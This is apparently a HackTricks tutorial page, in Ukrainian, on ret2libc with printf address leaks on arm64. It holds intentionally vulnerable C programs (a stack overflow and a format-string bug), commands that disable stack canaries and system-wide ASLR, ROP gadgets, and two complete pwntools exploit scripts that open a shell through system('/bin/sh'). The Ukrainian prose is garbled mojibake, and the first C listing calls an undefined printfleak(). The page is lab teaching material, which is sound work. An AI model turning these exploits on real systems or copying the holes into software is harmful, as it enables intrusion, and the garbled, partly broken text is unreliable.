# Ret2lib + Printf leak - arm64

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}

## Ret2lib - –æ–±—Ö–æ–¥–∂–µ–Ω–Ω—è NX –∑ ROP (–±–µ–∑ ASLR)
```c
#include <stdio.h>

void bof()
{
char buf[100];
printf("\nbof>\n");
fgets(buf, sizeof(buf)*3, stdin);
}

void main()
{
printfleak();
bof();
}
```
–°–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ –±–µ–∑ –∫–∞–Ω–∞—Ä–∫–∏:
```bash
clang -o rop-no-aslr rop-no-aslr.c -fno-stack-protector
# Disable aslr
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
### –ó–Ω–∞–π—Ç–∏ –∑—Å—É–≤

### –ó—Å—É–≤ x30

–°—Ç–≤–æ—Ä—é—é—á–∏ —à–∞–±–ª–æ–Ω –∑ **`pattern create 200`**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—á–∏ –∑—Å—É–≤ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`pattern search $x30`**, –º–∏ –º–æ–∂–µ–º–æ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –∑—Å—É–≤ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å **`108`** (0x6c).

<figure><img src="../../../.gitbook/assets/image (1218).png" alt="" width="563"><figcaption></figcaption></figure>

–î–∏–≤–ª—è—á–∏—Å—å –Ω–∞ –¥–∏–∑–∞—Å–µ–º–±–ª—å–æ–≤–∞–Ω—É –æ—Å–Ω–æ–≤–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é, –º–∏ –º–æ–∂–µ–º–æ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –º–∏ —Ö–æ—á–µ–º–æ **–ø–µ—Ä–µ–π—Ç–∏** –¥–æ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó, —â–æ–± –ø–µ—Ä–µ–π—Ç–∏ –¥–æ **`printf`** –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ, –∑—Å—É–≤ —è–∫–æ—ó –≤—ñ–¥ –º—ñ—Å—Ü—è, –¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –±—ñ–Ω–∞—Ä–Ω–∏–∫, —Å—Ç–∞–Ω–æ–≤–∏—Ç—å **`0x860`**:

<figure><img src="../../../.gitbook/assets/image (1219).png" alt=""><figcaption></figcaption></figure>

### –ó–Ω–∞–π—Ç–∏ —Å–∏—Å—Ç–µ–º–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é —Ç–∞ —Ä—è–¥–æ–∫ `/bin/sh`

–û—Å–∫—ñ–ª—å–∫–∏ ASLR –≤–∏–º–∫–Ω–µ–Ω–æ, –∞–¥—Ä–µ—Å–∏ –∑–∞–≤–∂–¥–∏ –±—É–¥—É—Ç—å –æ–¥–Ω–∞–∫–æ–≤–∏–º–∏:

<figure><img src="../../../.gitbook/assets/image (1222).png" alt=""><figcaption></figcaption></figure>

### –ó–Ω–∞–π—Ç–∏ –≥–∞–¥–∂–µ—Ç–∏

–ù–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –≤ **`x0`** –∞–¥—Ä–µ—Å—É –¥–æ —Ä—è–¥–∫–∞ **`/bin/sh`** —Ç–∞ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **`system`**.

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ rooper, –±—É–≤ –∑–Ω–∞–π–¥–µ–Ω–∏–π —Ü—ñ–∫–∞–≤–∏–π –≥–∞–¥–∂–µ—Ç:
```
0x000000000006bdf0: ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;
```
–¶–µ–π –≥–∞–¥–∂–µ—Ç –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å `x0` –∑ **`$sp + 0x18`** —ñ –ø–æ—Ç—ñ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å –∞–¥—Ä–µ—Å–∏ x29 —Ç–∞ x30 –∑ sp —ñ —Å—Ç—Ä–∏–±–Ω–µ –¥–æ x30. –û—Ç–∂–µ, –∑ —Ü–∏–º –≥–∞–¥–∂–µ—Ç–æ–º –º–∏ –º–æ–∂–µ–º–æ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –ø–µ—Ä—à–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç —ñ –ø–æ—Ç—ñ–º —Å—Ç—Ä–∏–±–Ω—É—Ç–∏ –¥–æ system**.

### Exploit
```python
from pwn import *
from time import sleep

p = process('./rop')  # For local binary
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")
libc.address = 0x0000fffff7df0000
binsh = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
system = libc.sym["system"]

def expl_bof(payload):
p.recv()
p.sendline(payload)

# Ret2main
stack_offset = 108
ldr_x0_ret = p64(libc.address + 0x6bdf0) # ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;

x29 = b"AAAAAAAA"
x30 = p64(system)
fill = b"A" * (0x18 - 0x10)
x0 = p64(binsh)

payload = b"A"*stack_offset + ldr_x0_ret + x29 + x30 + fill + x0
p.sendline(payload)

p.interactive()
p.close()
```
## Ret2lib - –æ–±—Ö—ñ–¥ NX, ASL —Ç–∞ PIE –∑ –≤–∏—Ç–æ–∫–∞–º–∏ printf –∑—ñ —Å—Ç–µ–∫—É
```c
#include <stdio.h>

void printfleak()
{
char buf[100];
printf("\nPrintf>\n");
fgets(buf, sizeof(buf), stdin);
printf(buf);
}

void bof()
{
char buf[100];
printf("\nbof>\n");
fgets(buf, sizeof(buf)*3, stdin);
}

void main()
{
printfleak();
bof();
}

```
–°–∫–æ–º–ø—ñ–ª—é–≤–∞—Ç–∏ **–±–µ–∑ –∫–∞–Ω–∞—Ä–∫–∏**:
```bash
clang -o rop rop.c -fno-stack-protector -Wno-format-security
```
### PIE —Ç–∞ ASLR, –∞–ª–µ –±–µ–∑ –∫–∞–Ω–∞—Ä–∫–∏

* –†–∞—É–Ω–¥ 1:
* –í–∏—Ç—ñ–∫ PIE –∑—ñ —Å—Ç–µ–∫—É
* –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è bof, —â–æ–± –ø–æ–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ main
* –†–∞—É–Ω–¥ 2:
* –í–∏—Ç—ñ–∫ libc –∑—ñ —Å—Ç–µ–∫—É
* ROP: ret2system

### –í–∏—Ç–æ–∫–∏ Printf

–í—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ —Ç–æ—á–∫—É –∑—É–ø–∏–Ω–∫–∏ –ø–µ—Ä–µ–¥ –≤–∏–∫–ª–∏–∫–æ–º printf, –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ –≤ —Å—Ç–µ–∫—É —î –∞–¥—Ä–µ—Å–∏ –¥–ª—è –ø–æ–≤–µ—Ä–Ω–µ–Ω–Ω—è –¥–æ –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É, –∞ —Ç–∞–∫–æ–∂ –∞–¥—Ä–µ—Å–∏ libc:

<figure><img src="../../../.gitbook/assets/image (1215).png" alt="" width="563"><figcaption></figcaption></figure>

–°–ø—Ä–æ–±—É–≤–∞–≤—à–∏ —Ä—ñ–∑–Ω—ñ –∑—Å—É–≤–∏, **`%21$p`** –º–æ–∂–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É (–æ–±—Ö—ñ–¥ PIE), –∞ **`%25$p`** –º–æ–∂–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –∞–¥—Ä–µ—Å—É libc:

<figure><img src="../../../.gitbook/assets/image (1223).png" alt="" width="440"><figcaption></figcaption></figure>

–í—ñ–¥–Ω—ñ–º–∞—é—á–∏ –≤–∏—Ç—ñ–∫–Ω—É –∞–¥—Ä–µ—Å—É libc –≤—ñ–¥ –±–∞–∑–æ–≤–æ—ó –∞–¥—Ä–µ—Å–∏ libc, –º–æ–∂–Ω–∞ –ø–æ–±–∞—á–∏—Ç–∏, —â–æ **–∑—Å—É–≤** –≤–∏—Ç—ñ–∫–Ω–µ–Ω–æ—ó –∞–¥—Ä–µ—Å–∏ –≤—ñ–¥ –±–∞–∑–∏ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å `0x49c40`.

### –ó—Å—É–≤ x30

–î–∏–≤—ñ—Ç—å—Å—è –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –ø—Ä–∏–∫–ª–∞–¥, –æ—Å–∫—ñ–ª—å–∫–∏ bof —Ç–æ–π –∂–µ.

### –ó–Ω–∞–π—Ç–∏ –≥–∞–¥–∂–µ—Ç–∏

–Ø–∫ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ, –Ω–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –º–∞—Ç–∏ –≤ **`x0`** –∞–¥—Ä–µ—Å—É —Ä—è–¥–∫–∞ **`/bin/sh`** —ñ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **`system`**.

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ rooper, –±—É–ª–æ –∑–Ω–∞–π–¥–µ–Ω–æ —â–µ –æ–¥–∏–Ω —Ü—ñ–∫–∞–≤–∏–π –≥–∞–¥–∂–µ—Ç:
```
0x0000000000049c40: ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;
```
–¶–µ–π –≥–∞–¥–∂–µ—Ç –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å `x0` –∑ **`$sp + 0x78`** —ñ –ø–æ—Ç—ñ–º –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å –∞–¥—Ä–µ—Å–∏ x29 —Ç–∞ x30 –∑ sp —ñ —Å—Ç—Ä–∏–±–Ω–µ –¥–æ x30. –û—Ç–∂–µ, –∑ —Ü–∏–º –≥–∞–¥–∂–µ—Ç–æ–º –º–∏ –º–æ–∂–µ–º–æ **–∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞—Ç–∏ –ø–µ—Ä—à–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç —ñ –ø–æ—Ç—ñ–º —Å—Ç—Ä–∏–±–Ω—É—Ç–∏ –¥–æ system**.

### Exploit
```python
from pwn import *
from time import sleep

p = process('./rop')  # For local binary
libc = ELF("/usr/lib/aarch64-linux-gnu/libc.so.6")

def leak_printf(payload, is_main_addr=False):
p.sendlineafter(b">\n" ,payload)
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
if is_main_addr:
response = response[:-4] + b"0000"
return int(response, 16)

def expl_bof(payload):
p.recv()
p.sendline(payload)

# Get main address
main_address = leak_printf(b"%21$p", True)
print(f"Bin address: {hex(main_address)}")

# Ret2main
stack_offset = 108
main_call_printf_offset = 0x860 #Offset inside main to call printfleak
print("Going back to " + str(hex(main_address + main_call_printf_offset)))
ret2main = b"A"*stack_offset + p64(main_address + main_call_printf_offset)
expl_bof(ret2main)

# libc
libc_base_address = leak_printf(b"%25$p") - 0x26dc4
libc.address = libc_base_address
print(f"Libc address: {hex(libc_base_address)}")
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym["system"]

# ret2system
ldr_x0_ret = p64(libc.address + 0x49c40) # ldr x0, [sp, #0x78]; ldp x29, x30, [sp], #0xc0; ret;

x29 = b"AAAAAAAA"
x30 = p64(system)
fill = b"A" * (0x78 - 0x10)
x0 = p64(binsh)

payload = b"A"*stack_offset + ldr_x0_ret + x29 + x30 + fill + x0
p.sendline(payload)

p.interactive()
```
{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
